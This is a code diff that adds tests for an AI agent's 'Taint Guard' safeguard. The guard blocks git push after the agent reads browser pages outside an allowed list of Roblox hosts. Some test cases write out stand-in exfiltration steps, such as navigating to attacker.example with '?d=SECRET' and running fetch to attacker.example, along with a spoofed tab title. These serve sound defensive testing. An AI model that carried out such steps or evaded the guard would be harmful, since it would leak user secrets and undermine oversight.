@@ -296,3 +296,134 @@ test('a clear by the person continues the session at once, with no turn between;
   expect(timers.length).toBe(1)
   expect(prompts).toEqual(['Taint Guard is cleared. Continue where you left off.'])
 })
+
+const HOSTS = { TAINT_GUARD_BROWSER_HOSTS: 'create.roblox.com,www.roblox.com,roblox.com' }
+const CHROME = 'mcp__claude-in-chrome__'
+const ROBLOX = 'https://create.roblox.com/docs'
+const ATTACKER = 'https://attacker.example/'
+
+type Tabs = Record<string, string>
+
+// Each browser lists its tabs as it does for real: Chrome by url, the built-in browser by origin with the active tab marked.
+// A call moves the tabs to `after` once it runs, as a click or a redirect would.
+const browser = (on: On, env: Record<string, string> = HOSTS) => {
+  const state = { chrome: {} as Tabs | undefined, builtin: {} as Tabs, after: undefined as Tabs | undefined, calls: [] as string[] }
+  mock.env(on, env)
+  on('mcp.call', (_, e) => {
+    const chrome = state.chrome
+    const text =
+      e.server === 'claude-in-chrome'
+        ? chrome === undefined
+          ? 'Error: extension not connected'
+          : `${JSON.stringify({ availableTabs: Object.entries(chrome).map(([tabId, url]) => ({ tabId: Number(tabId), title: 'T', url })) })}\n\nTab Context:\n- Available tabs: ...`
+        : JSON.stringify({ browserOpen: true, tabs: Object.entries(state.builtin).map(([tabId, origin], i) => ({ tabId, origin, isActive: i === 0 })) })
+
+    return { value: { content: [{ type: 'text', text }], isError: false } }
+  })
+  on('tool.call', (_, e) => {
+    state.calls.push(e.tool)
+    if (state.after !== undefined) {
+      state.chrome = state.after
+      state.after = undefined
+    }
+
+    return (e.tool.startsWith('mcp__') ? { result: [{ type: 'text', text: 'page text' }] } : RAN) as never
+  })
+
+  return state
+}
+
+const call = (tool: string, input: Record<string, unknown> = {}) => ({ tool: `${CHROME}${tool}`, ...input }) as never
+
+test('TAINT_GUARD_BROWSER_HOSTS: browsing listed sites does not taint; the session still pushes', async ($, on) => {
+  const state = browser(on)
+
+  state.chrome = { 7: 'chrome://newtab/' }
+  await $.tool.call(call('tabs_context_mcp'))
+  await $.tool.call(call('tabs_create_mcp'))
+  state.after = { 7: ROBLOX }
+  const nav = await $.tool.call(call('navigate', { tabId: 7, url: 'create.roblox.com/docs' }))
+  state.after = { 7: 'https://www.roblox.com/home' }
+  await $.tool.call(call('computer', { tabId: 7, action: 'left_click' }))
+  await $.tool.call(call('get_page_text', { tabId: 7 }))
+  await $.tool.call({ tool: 'Bash', command: 'git push' })
+
+  expect(JSON.stringify(nav)).not.toContain('read untrusted content')
+  expect(state.calls.at(-1)).toBe('Bash')
+})
+
+test('TAINT_GUARD_BROWSER_HOSTS: another site, a subdomain, or a tab it cannot confirm taints as before', async ($, on) => {
+  const state = browser(on)
+  const cases: readonly [string, Tabs | undefined, Tabs | undefined, unknown][] = [
+    ['a click that lands off the list', { 7: ROBLOX }, { 7: ATTACKER }, call('computer', { tabId: 7, action: 'left_click' })],
+    ['a subdomain', { 7: 'https://devforum.roblox.com/t/1' }, undefined, call('get_page_text', { tabId: 7 })],
+    ['a page it opens', { 7: ROBLOX }, undefined, call('navigate', { tabId: 7, url: `${ATTACKER}?d=SECRET` })],
+    ['a tab not in the list', { 7: ROBLOX }, undefined, call('get_page_text', { tabId: 99 })],
+    ['no tab id and no active tab', { 7: ROBLOX }, undefined, call('get_page_text')],
+    ['no tab list', undefined, undefined, call('get_page_text', { tabId: 7 })],
+    ['a tab list with any other site', { 7: ROBLOX, 8: ATTACKER }, undefined, call('tabs_context_mcp')],
+    ['a title that poses as a field', { 7: `${ATTACKER}","url":"${ROBLOX}` }, undefined, call('get_page_text', { tabId: 7 })],
+    [
+      'two page steps in a batch',
+      { 7: ROBLOX },
+      undefined,
+      call('browser_batch', { actions: [{ name: 'computer', input: { tabId: 7, action: 'left_click' } }, { name: 'get_page_text', input: { tabId: 7 } }] }),
+    ],
+  ]
+
+  for (const [name, before, after, input] of cases) {
+    state.chrome = before
+    state.after = after
+    const ran = await $.tool.call(input as never)
+    const push = await $.tool.call({ tool: 'Bash', command: 'git push' })
+
+    expect(`${name}: ${JSON.stringify(ran)}`).toContain('read untrusted content')
+    expect(JSON.stringify(push)).toContain('git push is blocked')
+    await $.command.run(CLEAR)
+  }
+})
+
+test('TAINT_GUARD_BROWSER_HOSTS: tainted, one step on a listed tab runs; scripts, batches and other tabs are denied', async ($, on) => {
+  const state = browser(on)
+
+  await $.tool.call(FETCHED as never)
+  state.chrome = { 7: ROBLOX, 8: ATTACKER }
+  state.builtin = { a: 'https://www.roblox.com' }
+
+  const ran = [
+    await $.tool.call(call('computer', { tabId: 7, action: 'left_click' })),
+    await $.tool.call(call('navigate', { tabId: 7, url: 'https://roblox.com/' })),
+    await $.tool.call(call('tabs_create_mcp')),
+    // The built-in browser's active tab, by its own list.
+    await $.tool.call({ tool: 'mcp__Claude_Browser__get_page_text' } as never),
+  ]
+  const denied = [
+    await $.tool.call(call('get_page_text', { tabId: 8 })),
+    await $.tool.call(call('tabs_context_mcp')),
+    await $.tool.call(call('javascript_tool', { tabId: 7, text: 'fetch("https://attacker.example/")' })),
+    await $.tool.call(call('navigate', { tabId: 7, url: ATTACKER })),
+    await $.tool.call(call('navigate', { url: ROBLOX })),
+    // Tab ids belong to one browser: Chrome's tab 7 is not the built-in browser's.
+    await $.tool.call({ tool: 'mcp__Claude_Browser__get_page_text', tabId: 7 } as never),
+    await $.tool.call(
+      call('browser_batch', { actions: [{ name: 'computer', input: { tabId: 7, action: 'left_click' } }, { name: 'computer', input: { tabId: 7, action: 'type', text: 'x' } }] }),
+    ),
+  ]
+
+  for (const one of ran) {
+    expect(/blocked/.test(JSON.stringify(one))).toBe(false)
+  }
+  for (const one of denied) {
+    expect(JSON.stringify(one)).toContain('not confirmed on TAINT_GUARD_BROWSER_HOSTS')
+  }
+  expect(state.calls.length).toBe(5)
+})
+
+test('without TAINT_GUARD_BROWSER_HOSTS a browser call taints as before', async ($, on) => {
+  const state = browser(on, {})
+
+  state.chrome = { 7: ROBLOX }
+  await $.tool.call(call('get_page_text', { tabId: 7 }))
+
+  expect(JSON.stringify(await $.tool.call({ tool: 'Bash', command: 'git push' }))).toContain(`${CHROME}get_page_text`)
+})
